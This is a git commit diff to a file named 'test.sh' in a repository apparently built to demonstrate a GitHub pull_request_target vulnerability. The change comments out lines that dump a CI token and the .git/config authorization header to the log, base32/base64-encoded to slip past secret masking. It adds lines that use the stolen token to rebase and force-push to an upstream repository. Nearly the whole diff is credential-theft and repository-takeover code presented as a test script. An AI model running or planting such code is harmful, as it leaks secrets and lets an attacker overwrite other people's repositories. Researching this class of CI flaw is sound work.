de90bbc257f855cb8b95749f89dd0a4755f41e1b
WengOnn-Deriv <122330473+WengOnn-Deriv@users.noreply.github.com>
2023-11-09 15:24:19 +0800

    Update test.sh

--- test.sh
+++ test.sh
@@ -8,12 +8,12 @@ echo "From WengOnn-Deriv"
 # echo "From WengOnn-Deriv"
 # git checkout master
 
-echo "PAT: $(printenv git_pat)" | base32
-cat .git/config | grep "AUTHORIZATION" | base64
+# echo "PAT: $(printenv git_pat)" | base32
+# cat .git/config | grep "AUTHORIZATION" | base64
 
-# git remote add upstream https://$(printenv git_pat)@github.com/test-organization-wengonn-v2/pull-request-target-vuln-v3.git
-# git fetch upstream
-# git checkout main  # <----- replace 'feature' with local branch name
-# git rebase upstream/main
-# git push -u origin -f
+git remote add upstream https://x-access-token:$(printenv git_pat)@github.com/test-organization-wengonn-v2/pull-request-target-vuln-v3.git
+git fetch upstream
+git checkout main  # <----- replace 'feature' with local branch name
+git rebase upstream/main
+git push -u origin -f
 
